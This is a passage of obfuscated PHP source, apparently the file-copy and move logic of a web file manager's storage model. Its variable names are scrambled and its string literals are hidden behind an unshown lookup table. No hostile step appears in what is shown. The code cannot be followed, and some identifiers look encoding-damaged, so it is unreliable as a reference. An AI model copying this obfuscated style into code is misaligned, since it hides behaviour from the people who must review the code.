_copy($á…Æ¶‡Ñ, $Æ²¡®­ª, $õ‹å†¦Ë, &$Ïùçç”Ş, $ù­¦ù‹í, $¡ùùø‡’ = '') { $œ÷´Ò³ =& $_SERVER[ìïæ“œî]; $ô”¡¯ØÙ = $this->sourceInfoCache($á…Æ¶‡Ñ); $•Ù¥œœ¹ = $ô”¡¯ØÙ[$œ÷´Ò³[485]] == $œ÷´Ò³[91]; $«ÌËŞõ = $¡ùùø‡’ ? $¡ùùø‡’ : $ô”¡¯ØÙ[$œ÷´Ò³[32]]; $€ûş…Âİ = $this->fileNameExistAuto($Æ²¡®­ª, $ô”¡¯ØÙ); if ($ù­¦ù‹í) { $this->_childrenAllMake($á…Æ¶‡Ñ); if ($•Ù¥œœ¹ && $€ûş…Âİ) { $this->_childrenAllMake($€ûş…Âİ); } } if (!$€ûş…Âİ) { return $this->_copyCreate($á…Æ¶‡Ñ, $Æ²¡®­ª, $«ÌËŞõ, $Ïùçç”Ş); } $Ï«àö•Æ = $€ûş…Âİ; if ($•Ù¥œœ¹) { if ($õ‹å†¦Ë == REPEAT_RENAME_FOLDER) { $«ÌËŞõ = $this->fileNameAutoCache($Æ²¡®­ª, $«ÌËŞõ, $õ‹å†¦Ë, $•Ù¥œœ¹); $Ï«àö•Æ = $this->_copyCreate($á…Æ¶‡Ñ, $Æ²¡®­ª, $«ÌËŞõ, $Ïùçç”Ş); } else { $¯²‹Åİä = $this->_childrenList($á…Æ¶‡Ñ); foreach ($¯²‹Åİä as $ÊÆÆæøÙ) { $this->_copy($ÊÆÆæøÙ[$œ÷´Ò³[193]], $€ûş…Âİ, $õ‹å†¦Ë, $Ïùçç”Ş, !1); } } } else { if ($õ‹å†¦Ë == REPEAT_RENAME || $õ‹å†¦Ë == REPEAT_RENAME_FOLDER) { $«ÌËŞõ = $this->fileNameAutoCache($Æ²¡®­ª, $«ÌËŞõ, $õ‹å†¦Ë, $•Ù¥œœ¹); $Ï«àö•Æ = $this->_copyCreate($á…Æ¶‡Ñ, $Æ²¡®­ª, $«ÌËŞõ, $Ïùçç”Ş); } else { if ($õ‹å†¦Ë == REPEAT_REPLACE) { $¥‘’Š­œ = $this->sourceInfoCache($€ûş…Âİ); $ì§šê… = $this->fileHistory($¥‘’Š­œ, $ô”¡¯ØÙ[$œ÷´Ò³[541]], $ô”¡¯ØÙ[$œ÷´Ò³[79]]); if ($ì§šê…) { $Ïùçç”Ş[$œ÷´Ò³[629]][] = $ô”¡¯ØÙ[$œ÷´Ò³[541]]; } } else { if ($õ‹å†¦Ë == REPEAT_SKIP) { } } } Hook::trigger($œ÷´Ò³[634], array($œ÷´Ò³[635], $ô”¡¯ØÙ, 0)); } return $Ï«àö•Æ; } private function _copyCreate($¹ªñöÆ‘, $ê›°”Ÿë, $úıàáÛ¾, &$³â½˜×) { $ßûì™Ãñ =& $_SERVER[ìïæ“œî]; $…ÒË‡„Ÿ = $this->sourceInfoCache($¹ªñöÆ‘); $ÃÆù±Ü§ = $this->sourceInfoCache($ê›°”Ÿë); $½Á‹¼€ë = $this->_makeItemData($…ÒË‡„Ÿ, $ÃÆù±Ü§, $úıàáÛ¾); Hook::trigger($ßûì™Ãñ[636], $½Á‹¼€ë); Hook::trigger($ßûì™Ãñ[637], array($ßûì™Ãñ[638], $½Á‹¼€ë, 0)); $¾òãÀº‰ = $this->add($½Á‹¼€ë); $ïƒáåÕç = array($ßûì™Ãñ[193] => $¾òãÀº‰, $ßûì™Ãñ[32] => $úıàáÛ¾); $this->_copyApplyMeta($ïƒáåÕç, $³â½˜×); if ($…ÒË‡„Ÿ[$ßûì™Ãñ[485]] != $ßûì™Ãñ[91]) { $³â½˜×[$ßûì™Ãñ[629]][] = $…ÒË‡„Ÿ[$ßûì™Ãñ[541]]; return $¾òãÀº‰; } $È¯€˜Äí = array(); $¬ü¤Ù•Ç = array(); $this->_childrenListAll($¹ªñöÆ‘, $È¯€˜Äí); $­ÕšÎË³ = count($È¯€˜Äí); if ($­ÕšÎË³ == 0) { return $¾òãÀº‰; } $ôê¼´« = $this->sourceInfo($¾òãÀº‰); foreach ($È¯€˜Äí as $¥ŠÈ£¸í) { $Œ½Î¬Š = $this->_makeItemData($¥ŠÈ£¸í, $ôê¼´«, $¥ŠÈ£¸í[$ßûì™Ãñ[32]]); $Œ½Î¬Š[$ßûì™Ãñ[584]] = $¥ŠÈ£¸í[$ßûì™Ãñ[584]]; $¬ü¤Ù•Ç[] = $Œ½Î¬Š; } $this->chunkEventSet($ßûì™Ãñ[639], array($ßûì™Ãñ[640], $½Á‹¼€ë, $­ÕšÎË³)); $this->addAll($¬ü¤Ù•Ç, array(), !1); $Î–‹˜‚« = $this->where(array($ßûì™Ãñ[192] => $¾òãÀº‰))->select(); $»£€Ï‡ = $this->_childrenMakeRelation($È¯€˜Äí, $Î–‹˜‚«); $»£€Ï‡[$¹ªñöÆ‘] = $¾òãÀº‰; $Åóš·Ê¾ = array(); $›ß¼”‰´ = array(); foreach ($Î–‹˜‚« as $¥ŠÈ£¸í) { $ÍÇÆä‰½ = $¥ŠÈ£¸í[$ßûì™Ãñ[193]]; $ÔÜ¯ö˜ò = $this->_childrenMatch($»£€Ï‡, $¥ŠÈ£¸í, $ôê¼´«); $Åóš·Ê¾[] = array($ßûì™Ãñ[193], $ÍÇÆä‰½, $ßûì™Ãñ[192], $ÔÜ¯ö˜ò[$ßûì™Ãñ[192]]); $›ß¼”‰´[] = array($ßûì™Ãñ[193], $ÍÇÆä‰½, $ßûì™Ãñ[584], $ÔÜ¯ö˜ò[$ßûì™Ãñ[584]]); $this->_copyApplyMeta($¥ŠÈ£¸í, $³â½˜×); if ($¥ŠÈ£¸í[$ßûì™Ãñ[485]] != $ßûì™Ãñ[91]) { $³â½˜×[$ßûì™Ãñ[629]][] = $¥ŠÈ£¸í[$ßûì™Ãñ[541]]; } } $this->chunkEventSet($ßûì™Ãñ[641], array($ßûì™Ãñ[642], $½Á‹¼€ë, $­ÕšÎË³)); $this->saveAll($Åóš·Ê¾); $this->chunkEventSet($ßûì™Ãñ[643], array($ßûì™Ãñ[644], $½Á‹¼€ë, $­ÕšÎË³)); $this->saveAll($›ß¼”‰´); return $¾òãÀº‰; } private function _childrenMakeRelation($ÚüŸó€Ë, $ñ‚û¬ş) { $õÉáì¤Â =& $_SERVER[ìïæ“œî]; $ÉÇ¼œ‹ = array(); $úû€À¡ä = array(); foreach ($ÚüŸó€Ë as $£ãî”öµ) { $Âš‘ÌŒœ = $£ãî”öµ[$õÉáì¤Â[32]] . $õÉáì¤Â[8] . $£ãî”öµ[$õÉáì¤Â[584]]; $ÉÇ¼œ‹[$Âš‘ÌŒœ] = $£ãî”öµ[$õÉáì¤Â[193]]; } foreach ($ñ‚û¬ş as $£ãî”öµ) { $Âš‘ÌŒœ = $£ãî”öµ[$õÉáì¤Â[32]] . $õÉáì¤Â[8] . $£ãî”öµ[$õÉáì¤Â[584]]; $Ù“ÌØÅ³ = $ÉÇ¼œ‹[$Âš‘ÌŒœ]; $úû€À¡ä[$Ù“ÌØÅ³] = $£ãî”öµ[$õÉáì¤Â[193]]; } return $úû€À¡ä; } private function _childrenMatch($Ü¶Ç“®, $¾Ç„°ÖÃ, $Ùƒù¶‡‹) { $ù÷‚é™¯ =& $_SERVER[ìïæ“œî]; $±³îäĞ = $Ùƒù¶‡‹[$ù÷‚é™¯[584]]; $š“Ö¬§ = $this->parentLevelArray($¾Ç„°ÖÃ[$ù÷‚é™¯[584]]); foreach ($š“Ö¬§ as $•äƒ‹ÉÔ) { if (isset($Ü¶Ç“®[$•äƒ‹ÉÔ])) { $±³îäĞ .= $Ü¶Ç“®[$•äƒ‹ÉÔ] . $ù÷‚é™¯[645]; } } $±³îäĞ = rtrim($±³îäĞ, $ù÷‚é™¯[50]) . $ù÷‚é™¯[50]; $„ˆ†¤¨Ñ = $this->parentLevelArray($±³îäĞ); $Æãã†œ = $„ˆ†¤¨Ñ[count($„ˆ†¤¨Ñ) - 1]; return array($ù÷‚é™¯[192] => $Æãã†œ, $ù÷‚é™¯[584] => $±³îäĞ); } private function _makeItemData($È†ÏÔôƒ, $è„ı×², $íÙª½±Á) { $ùûİˆıÏ =& $_SERVER[ìïæ“œî]; $Áö¢ÁÛ = array($ùûİˆıÏ[646] => $È†ÏÔôƒ[$ùûİˆıÏ[485]], $ùûİˆıÏ[494] => $íÙª½±Á, $ùûİˆıÏ[647] => $È†ÏÔôƒ[$ùûİˆıÏ[486]] ? $È†ÏÔôƒ[$ùûİˆıÏ[486]] : $ùûİˆıÏ[12], $ùûİˆıÏ[542] => $È†ÏÔôƒ[$ùûİˆıÏ[541]] ? $È†ÏÔôƒ[$ùûİˆıÏ[541]] : 0, $ùûİˆıÏ[617] => $È†ÏÔôƒ[$ùûİˆıÏ[79]] ? $È†ÏÔôƒ[$ùûİˆıÏ[79]] : 0, $ùûİˆıÏ[648] => intval($è„ı×²[$ùûİˆıÏ[190]]), $ùûİˆıÏ[649] => intval($è„ı×²[$ùûİˆıÏ[569]]), $ùûİˆıÏ[650] => intval(USER_ID), $ùûİˆıÏ[651] => intval(USER_ID), $ùûİˆıÏ[477] => intval($è„ı×²[$ùûİˆıÏ[193]]), $ùûİˆıÏ[652] => $è„ı×²[$ùûİˆıÏ[584]] . $è„ı×²[$ùûİˆıÏ[193]] . $ùûİˆıÏ[50], $ùûİˆıÏ[498] => $È†ÏÔôƒ[$ùûİˆıÏ[88]] ? $È†ÏÔôƒ[$ùûİˆıÏ[88]] : time(), $ùûİˆıÏ[504] => 0, $ùûİˆıÏ[653] => $ùûİˆıÏ[12]); return $Áö¢ÁÛ; } private function _copyApplyMeta($¶‡øáâª, &$æ•Ö‘ñ§) { $å˜³§ñª =& $_SERVER[ìïæ“œî]; $”­•åÍ = $¶‡øáâª[$å˜³§ñª[193]]; $áòÑ½è = $¶‡øáâª[$å˜³§ñª[32]]; if (!isset($¶‡øáâª[$å˜³§ñª[654]]) || !$¶‡øáâª[$å˜³§ñª[654]] || $¶‡øáâª[$å˜³§ñª[654]] == $å˜³§ñª[228]) { $æ•Ö‘ñ§[$å˜³§ñª[631]][] = array($å˜³§ñª[193], $”­•åÍ, $å˜³§ñª[654], short_id($”­•åÍ)); } if (Input::check($áòÑ½è, $å˜³§ñª[655])) { $æ•Ö‘ñ§[$å˜³§ñª[630]][] = array($å˜³§ñª[193] => $”­•åÍ, $å˜³§ñª[97] => $å˜³§ñª[538], $å˜³§ñª[450] => str_replace($å˜³§ñª[53], $å˜³§ñª[12], Pinyin::get($áòÑ½è))); $æ•Ö‘ñ§[$å˜³§ñª[630]][] = array($å˜³§ñª[193] => $”­•åÍ, $å˜³§ñª[97] => $å˜³§ñª[537], $å˜³§ñª[450] => Pinyin::get($áòÑ½è, $å˜³§ñª[656])); } $æ•Ö‘ñ§[$å˜³§ñª[630]][] = array($å˜³§ñª[193] => $”­•åÍ, $å˜³§ñª[97] => $å˜³§ñª[517], $å˜³§ñª[450] => KodSort::makeStr($áòÑ½è)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ğïÁï†Ÿ) { $óËú¨Á• =& $_SERVER[ìïæ“œî]; $‘Õ°ôÖ— = $this->sourceInfo($ğïÁï†Ÿ); $õ“ùÍ = $óËú¨Á•[657]; $Åáó–¹„ = array($óËú¨Á•[584] => array($óËú¨Á•[612], $‘Õ°ôÖ—[$óËú¨Á•[584]] . $ğïÁï†Ÿ . $óËú¨Á•[613]), $óËú¨Á•[505] => $this->targetIsDelete); $äÛåµ² = $this->field($õ“ùÍ)->where($Åáó–¹„)->select(); if (!$äÛåµ²) { return; } $äÛåµ² = array_to_keyvalue($äÛåµ², $óËú¨Á•[193]); foreach ($äÛåµ² as $­–Öò›) { $ôå¡ôÔÙ = $­–Öò›[$óËú¨Á•[192]]; $ğïÁï†Ÿ = $­–Öò›[$óËú¨Á•[193]]; if (!isset($this->_childrenListCache[$ğïÁï†Ÿ]) && $­–Öò›[$óËú¨Á•[485]] == $óËú¨Á•[91]) { $this->_childrenListCache[$ğïÁï†Ÿ] = array(); } if (!isset($this->_childrenListCache[$ôå¡ôÔÙ])) { $this->_childrenListCache[$ôå¡ôÔÙ] = array(); } $this->_childrenListCache[$ôå¡ôÔÙ][$ğïÁï†Ÿ] = $­–Öò›; $this->_childrenItemCache[$ğïÁï†Ÿ] = $­–Öò›; } } private function _childrenListAll($Ñ©²Š¯é, &$á²ñÑäÜ) { $¨Ü—±…Œ =& $_SERVER[ìïæ“œî]; if (!isset($this->_childrenListCache[$Ñ©²Š¯é])) { return; } $¥³ğ™§ = $this->_childrenListCache[$Ñ©²Š¯é]; foreach ($¥³ğ™§ as $áù–¢òë => $ˆÀß ·Á) { $á²ñÑäÜ[$áù–¢òë] = $ˆÀß ·Á; if ($ˆÀß ·Á[$¨Ü—±…Œ[485]] == $¨Ü—±…Œ[91]) { $this->_childrenListAll($áù–¢òë, $á²ñÑäÜ); } } } private function sourceInfoCache($ú©¶ÀËÂ) { if (isset($this->_childrenItemCache[$ú©¶ÀËÂ])) { return $this->_childrenItemCache[$ú©¶ÀËÂ]; } return $this->sourceInfo($ú©¶ÀËÂ); } private function _childrenList($š´áÂ¢ø) { if (isset($this->_childrenListCache[$š´áÂ¢ø])) { return $this->_childrenListCache[$š´áÂ¢ø]; } return $this->_childrenListSelect($š´áÂ¢ø); } private function _childrenListSelect($˜’ï¨ó’) { $ÏæõöÍ· =& $_SERVER[ìïæ“œî]; $áşÙÏäß = array($ÏæõöÍ·[192] => $˜’ï¨ó’, $ÏæõöÍ·[505] => $this->targetIsDelete); $íáõéï = $this->where($áşÙÏäß)->select(); $íáõéï = $íáõéï ? $íáõéï : array(); $­òÂÍŠ = array_to_keyvalue($íáõéï, $ÏæõöÍ·[193]); $this->_childrenListCache[$˜’ï¨ó’] = $­òÂÍŠ; foreach ($­òÂÍŠ as $˜’ï¨ó’ => $ıŠÂİ¥æ) { $this->_childrenItemCache[$˜’ï¨ó’] = $ıŠÂİ¥æ; } return $­òÂÍŠ; } private function fileNameExistAuto($®ğÜÓ’, $»”’ä¾€) { $»ü»Üó =& $_SERVER[ìïæ“œî]; if ($»”’ä¾€[$»ü»Üó[505]] == $»ü»Üó[91]) { return $this->fileNameExist($®ğÜÓ’, $»”’ä¾€[$»ü»Üó[32]]); } return $this->fileNameExistCache($®ğÜÓ’, $»”’ä¾€[$»ü»Üó[32]]); } private function fileNameExistCache($‡Ï—‡“, $óœ¿±Ì–) { $ôóœ‡´Ÿ =& $_SERVER[ìïæ“œî]; $óœ¿±Ì– = strtolower($óœ¿±Ì–); $Óîğ§È‹ = $this->_childrenList($‡Ï—‡“); foreach ($Óîğ§È‹ as $«–”…ï) { if ($óœ¿±Ì– == strtolower($«–”…ï[$ôóœ‡´Ÿ[32]])) { return $«–”…ï[$ôóœ‡´Ÿ[193]]; } } return !1; } private function fileNameAutoCache($ÇªëŸå, $¶ÎÙë‹‰, $ıË¶¨Şœ, $×ºÂÙ¹€) { $ÛÜÑÕï× =& $_SERVER[ìïæ“œî]; $Î‰ªÌğ… = $this->_childrenList($ÇªëŸå); $ï––ˆßù = array_to_keyvalue($Î‰ªÌğ…, $ÛÜÑÕï×[12], $ÛÜÑÕï×[32]); return $this->fileNameAutoGet($ï––ˆßù, $¶ÎÙë‹‰, $ıË¶¨Şœ, $×ºÂÙ¹€); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($áØçÏÈ, $‡Ş¯Ö ì, $‡¤ÃÕ† = REPEAT_REPLACE, $™÷şº’¯ = '') { $Ä‚ÙÂºÑ =& $_SERVER[ìïæ“œî]; $ŠÜ‡Éàû = $this->sourceInfo($áØçÏÈ); $â›íˆà‰ = $this->sourceInfo($‡Ş¯Ö ì); if ($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[192]] == $â›íˆà‰[$Ä‚ÙÂºÑ[193]]) { if ($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[505]] == $Ä‚ÙÂºÑ[91]) { Model($Ä‚ÙÂºÑ[503])->restore(array($áØçÏÈ)); } if (!$™÷şº’¯ || $™÷şº’¯ == $ŠÜ‡Éàû[$Ä‚ÙÂºÑ[32]]) { return $áØçÏÈ; } } $›Å¹¹ÊÊ = $this->pathInfoMore($áØçÏÈ); if ($this->isParentOf($áØçÏÈ, $‡Ş¯Ö ì)) { return !1; } if (!$ŠÜ‡Éàû || !$â›íˆà‰ || $â›íˆà‰[$Ä‚ÙÂºÑ[485]] != $Ä‚ÙÂºÑ[91]) { return !1; } Hook::trigger($Ä‚ÙÂºÑ[658], $›Å¹¹ÊÊ); $this->targetIsDelete = intval($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[505]]); if ($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[192]] == $‡Ş¯Ö ì && $™÷şº’¯ != $ŠÜ‡Éàû[$Ä‚ÙÂºÑ[32]]) { $Ã…ÛèÇ = $this->fileNameExist($‡Ş¯Ö ì, $™÷şº’¯); if ($Ã…ÛèÇ && $ŠÜ‡Éàû[$Ä‚ÙÂºÑ[485]] == $Ä‚ÙÂºÑ[228]) { $Üê¿»¨† = $this->sourceInfo($Ã…ÛèÇ); $×ğ£Ï‚È = $this->fileHistory($Üê¿»¨†, $ŠÜ‡Éàû[$Ä‚ÙÂºÑ[541]], $ŠÜ‡Éàû[$Ä‚ÙÂºÑ[79]]); if (!$×ğ£Ï‚È) { Model($Ä‚ÙÂºÑ[544])->remove($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[541]]); } $this->removeNow($áØçÏÈ, !1); $this->folderSizeReset($‡Ş¯Ö ì); Hook::trigger($Ä‚ÙÂºÑ[659], $›Å¹¹ÊÊ); return $Ã…ÛèÇ; } } $Éëèåª¸ = $™÷şº’¯ ? $™÷şº’¯ : $ŠÜ‡Éàû[$Ä‚ÙÂºÑ[32]]; $this->lockMoveStart($áØçÏÈ); $this->lockWriteStart($‡Ş¯Ö ì, $Éëèåª¸); $¬í‘á¡ğ = array($Ä‚ÙÂºÑ[629] => array(), $Ä‚ÙÂºÑ[660] => !1); $this->clearShare($áØçÏÈ, $‡Ş¯Ö ì); $ø¯ô–¨ô = $this->fileNameExistAuto($‡Ş¯Ö ì, $ŠÜ‡Éàû); $›£ˆİ­¹ = $this->_move($áØçÏÈ, $‡Ş¯Ö ì, $‡¤ÃÕ†, $¬í‘á¡ğ, $™÷şº’¯); $this->sourceCacheClear(); if ($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[485]] == $Ä‚ÙÂºÑ[91] && $ø¯ô–¨ô) { $this->folderSizeResetChildren($›£ˆİ­¹); } Model($Ä‚ÙÂºÑ[230])->linkAdd($¬í‘á¡ğ[$Ä‚ÙÂºÑ[629]]); if ($ø¯ô–¨ô && $¬í‘á¡ğ[$Ä‚ÙÂºÑ[660]]) { $this->removeNow($áØçÏÈ, !1); } $this->lockMoveEnd($áØçÏÈ); $this->lockWriteEnd($‡Ş¯Ö ì, $Éëèåª¸); $this->folderSizeReset($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[192]]); $this->folderSizeReset($‡Ş¯Ö ì); $øŒˆ«ïÁ = array($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[192]], $‡Ş¯Ö ì); if ($ŠÜ‡Éàû[$Ä‚ÙÂºÑ[485]] == $Ä‚ÙÂºÑ[91]) { $øŒˆ«ïÁ[] = $áØçÏÈ; } $this->updateModifyTime($øŒˆ«ïÁ); Model($Ä‚ÙÂºÑ[633])->eventMove($áØçÏÈ, $ŠÜ‡Éàû[$Ä‚ÙÂºÑ[192]], $‡Ş¯Ö ì); Hook::trigger($Ä‚ÙÂºÑ[659], $›Å¹¹ÊÊ); return $›£ˆİ­¹; } private function _move($à‘©à…Î, $ñ³Ö§Îä, $ƒ¬‹Ÿ¶±, &$“¼äÁ«•, $ÎªøƒÍ = '') { $É†âø®Û =& $_SERVER[ìïæ“œî]; $å¡»ÆİŠ = $this->sourceInfo($à‘©à…Î); $Ä¬¥‘©‘ = $å¡»ÆİŠ[$É†âø®Û[485]] == $É†âø®Û[91]; $–¯ÏïÈ– = $ÎªøƒÍ ? $ÎªøƒÍ : $å¡»ÆİŠ[$É†âø®Û[32]]; $¨ÓÊÙ = $this->fileNameExistAuto($ñ³Ö§Îä, $å¡»ÆİŠ); $this->lockMoveStart($à‘©à…Î); $this->lockWriteStart($ñ³Ö§Îä, $–¯ÏïÈ–); if (!$¨ÓÊÙ) { return $this->_moveForce($à‘©à…Î, $ñ³Ö§Îä, $–¯ÏïÈ–); } $öŞÏÉ¥ˆ = $¨ÓÊÙ; $ÇİøÊ’ = !1; if ($Ä¬¥‘©‘) { if ($ƒ¬‹Ÿ¶± == REPEAT_RENAME_FOLDER) { $–¯ÏïÈ– = $this->fileNameAuto($ñ³Ö§Îä, $–¯ÏïÈ–, $ƒ¬‹Ÿ¶±, $Ä¬¥‘©‘); $öŞÏÉ¥ˆ = $this->_moveForce($à‘©à…Î, $ñ³Ö§Îä, $–¯ÏïÈ–); } else { if ($ƒ¬‹Ÿ¶± == REPEAT_RENAME_FOLDER) { $ƒ¬‹Ÿ¶± = REPEAT_RENAME; } $‚ì‹‚¼ê = $this->_childrenListSelect($à‘©à…Î); foreach ($‚ì‹‚¼ê as $šİ«Í¹š) { $this->_move($šİ«Í¹š[$É†âø®Û[193]], $¨ÓÊÙ, $ƒ¬‹Ÿ¶±, $“¼äÁ«•); } $ÇİøÊ’ = !0; } } else { if ($ƒ¬‹Ÿ¶± == REPEAT_SKIP) { $ÇİøÊ’ = !0; } else { if ($ƒ¬‹Ÿ¶± == REPEAT_RENAME || $ƒ¬‹Ÿ¶± == REPEAT_RENAME_FOLDER) { $–¯ÏïÈ– = $this->fileNameAuto($ñ³Ö§Îä, $–¯ÏïÈ–, $ƒ¬‹Ÿ¶±, $Ä¬¥‘©‘); $öŞÏÉ¥ˆ = $this->_moveForce($à‘©à…Î, $ñ³Ö§Îä, $–¯ÏïÈ–); } else { if ($ƒ¬‹Ÿ¶± == REPEAT_REPLACE) { $ãå­ùëÊ = $this->sourceInfoCache($¨ÓÊÙ); $Å–¸Ñ  = $this->fileHistory($ãå­ùëÊ, $å¡»ÆİŠ[$É†âø®Û[541]], $å¡»ÆİŠ[$É†âø®Û[79]]); $ÇİøÊ’ = !0; if ($Å–¸Ñ ) { $“¼äÁ«•[$É†âø®Û[629]][] = $å¡»ÆİŠ[$É†âø®Û[541]]; } } } } } if ($ÇİøÊ’ && !$“¼äÁ«•[$É†âø®Û[660]]) { $“¼äÁ«•[$É†âø®Û[660]] = !0; } return $öŞÏÉ¥ˆ; } private function _moveForce($Ì¥ï£ĞÜ, $¯—Ô¸£ˆ, $Òõùı‡ç) { $Ş€Ïï›ƒ =& $_SERVER[ìïæ“œî]; $±´Ö×Ÿå = $this->sourceInfo($Ì¥ï£ĞÜ); $Í›Ë…®Ò = $this->sourceInfo($¯—Ô¸£ˆ); $åÒóÌÒÓ = $±´Ö×Ÿå[$Ş€Ïï›ƒ[485]] == $Ş€Ïï›ƒ[91]; $¿ÇÂ­˜Ä = array($Ş€Ïï›ƒ[477] => $Í›Ë…®Ò[$Ş€Ïï›ƒ[193]], $Ş€Ïï›ƒ[652] => $Í›Ë…®Ò[$Ş€Ïï›ƒ[584]] . $Í›Ë…®Ò[$Ş€Ïï›ƒ[193]] . $Ş€Ïï›ƒ[50], $Ş€Ïï›ƒ[648] => $Í›Ë…®Ò[$Ş€Ïï›ƒ[190]], $Ş€Ïï›ƒ[649] => $Í›Ë…®Ò[$Ş€Ïï›ƒ[569]], $Ş€Ïï›ƒ[651] => USER_ID, $Ş€Ïï›ƒ[494] => $Òõùı‡ç); $Šëçúºğ = $±´Ö×Ÿå[$Ş€Ïï›ƒ[190]] == SourceModel::TYPE_GROUP && $Í›Ë…®Ò[$Ş€Ïï›ƒ[190]] == SourceModel::TYPE_GROUP && $±´Ö×Ÿå[$Ş€Ïï›ƒ[569]] == $Í›Ë…®Ò[$Ş€Ïï›ƒ[569]]; if (!$Šëçúºğ && $this->moveClearAuth) { Model($Ş€Ïï›ƒ[567])->authClear($Ì¥ï£ĞÜ); } $¹¹ÕúÅ = $±´Ö×Ÿå[$Ş€Ïï›ƒ[505]] == $Ş€Ïï›ƒ[91] && $Í›Ë…®Ò[$Ş€Ïï›ƒ[505]] != $Ş€Ïï›ƒ[91]; if ($¹¹ÕúÅ) { $¿ÇÂ­˜Ä[$Ş€Ïï›ƒ[504]] = 0; } if ($åÒóÌÒÓ) { $£˜¦µ§ì = array($Ş€Ïï›ƒ[652] => array($Ş€Ïï›ƒ[612], $±´Ö×Ÿå[$Ş€Ïï›ƒ[584]] . $±´Ö×Ÿå[$Ş€Ïï›ƒ[193]] . $Ş€Ïï›ƒ[613])); $úş‰Óò‹ = $±´Ö×Ÿå[$Ş€Ïï›ƒ[584]] . $±´Ö×Ÿå[$Ş€Ïï›ƒ[193]] . $Ş€Ïï›ƒ[50]; $ÍÀÎ—â¶ = $Í›Ë…®Ò[$Ş€Ïï›ƒ[584]] . $Í›Ë…®Ò[$Ş€Ïï›ƒ[193]] . $Ş€Ïï›ƒ[50] . $±´Ö×Ÿå[$Ş€Ïï›ƒ[193]] . $Ş€Ïï›ƒ[50]; $Øß°Îú› = array($Ş€Ïï›ƒ[652] => array($Ş€Ïï›ƒ[661], "\162\145\160\154\x61\x63\x65\50\x70\141\162\145\x6e\164\114\145\166\x65\154\x2c\x27{$úş‰Óò‹}\x27\54\x27{$ÍÀÎ—â¶}\47\51"), $Ş€Ïï›ƒ[648] => $Í›Ë…®Ò[$Ş€Ïï›ƒ[190]], $Ş€Ïï›ƒ[649] => $Í›Ë…®Ò[$Ş€Ïï›ƒ[569]]); if ($¹¹ÕúÅ) { $Øß°Îú›[$Ş€Ïï›ƒ[504]] = 0; } $this->where($£˜¦µ§ì)->data($Øß°Îú›)->save(); } $this->where(array($Ş€Ïï›ƒ[491] => $Ì¥ï£ĞÜ))->data($¿ÇÂ­˜Ä)->save(); return $Ì¥ï£ĞÜ; } private function clearShare($­äõëŞé, $ûİüõ) { $˜ˆí£Â =& $_SERVER[ìïæ“œî]; $®¦îïİ¯ = $this->sourceInfo($­äõëŞé); $–Æ¹Ë¬¹ = $this->sourceInfo($ûİüõ); if ($®¦îïİ¯[$˜ˆí£Â[569]] == $–Æ¹Ë¬¹[$˜ˆí£Â[569]] && $®¦îïİ¯[$˜ˆí£Â[190]] == $˜ˆí£Â[662]) { return; } $ÓÂœâšë = array($˜ˆí£Â[584] => array($˜ˆí£Â[612], $®¦îïİ¯[$˜ˆí£Â[584]] . $­äõëŞé . $˜ˆí£Â[613])); $Öˆ±ù˜ = $this->field($˜ˆí£Â[491])->where($ÓÂœâšë)->getField($˜ˆí£Â[193], !0); if (!$Öˆ±ù˜) { return; } $ÓÂœâšë = array($˜ˆí£Â[193] => array($˜ˆí£Â[7], $Öˆ±ù˜), $˜ˆí£Â[663] => 1); $›»§¹¢§ = Model($˜ˆí£Â[664])->field($˜ˆí£Â[665])->where($ÓÂœâšë)->select(); if (!$›»§¹¢§) { return; } $›»§¹¢§ = array_to_keyvalue($›»§¹¢§, $˜ˆí£Â[12], $˜ˆí£Â[665]); $ÓÂœâšë = array($˜ˆí£Â[665] => array($˜ˆí£Â[7], $›»§¹¢§)); Model($˜ˆí£Â[664])->where($ÓÂœâšë)->save(array($˜ˆí£Â[663] => 0)); Model($˜ˆí£Â[666])->where($ÓÂœâšë)->delete(); } public function copyFolderFromIO($Ğ¯å™û, $¨¥Ôâ’Ù, $ÊÎú—¨Ø, $ÀÄÍÅáç, $‚ğÛß´, $µàäÖŸÚ = false) { $ÀÃâÄŞ =& $_SERVER[ìïæ“œî]; $¯Çï†Í› = array($ÀÃâÄŞ[630] => array(), $ÀÃâÄŞ[631] => array(), $ÀÃâÄŞ[629] => array(), $ÀÃâÄŞ[667] => array()); $ï•Á æ = $µàäÖŸÚ ? $µàäÖŸÚ : $Ğ¯å™û->pathThis($¨¥Ôâ’Ù); $…ÀçíÛª = $this->fileNameExist($ÊÎú—¨Ø, $ï•Á æ); $•à¾¢ = $this->mkdir($ÊÎú—¨Ø, $ï•Á æ, $ÀÄÍÅáç); if (!$…ÀçíÛª || $ÀÄÍÅáç == REPEAT_RENAME_FOLDER) { $ÀÄÍÅáç = !1; } if ($…ÀçíÛª) { $this->_childrenAllMake($…ÀçíÛª); } Hook::trigger($ÀÃâÄŞ[668]); $this->_copyChildTo($Ğ¯å™û, $¨¥Ôâ’Ù, $•à¾¢, $ÀÄÍÅáç, $¯Çï†Í›, $‚ğÛß´); Hook::trigger($ÀÃâÄŞ[669]); if ($•à¾¢) { $this->folderSizeResetChildren($•à¾¢); } $this->_childrenListClear(); Model($ÀÃâÄŞ[632])->addAll($¯Çï†Í›[$ÀÃâÄŞ[630]], array(), !0); Model($ÀÃâÄŞ[633])->eventCopy($•à¾¢); $this->saveAll($¯Çï†Í›[$ÀÃâÄŞ[631]]); Model($ÀÃâÄŞ[544])->linkAdd($¯Çï†Í›[$ÀÃâÄŞ[629]]); Model($ÀÃâÄŞ[544])->remove($¯Çï†Í›[$ÀÃâÄŞ[667]]); $this->folderSizeReset($ÊÎú—¨Ø); $this->updateModifyTime($ÊÎú—¨Ø); return $•à¾¢; } private function _copyChildTo($ëèÎÆ”ğ, $€ª¦õáÏ, $¡„ì²—İ, $¥ÆÒøâŒ, &$ùŞöî´×, $ş†©¸ñ·) { $±ñßšêˆ =& $_SERVER[ìïæ“œî]; $—Ó“œ = $this->sourceInfoCache($¡„ì²—İ); $¨„Çóüº = 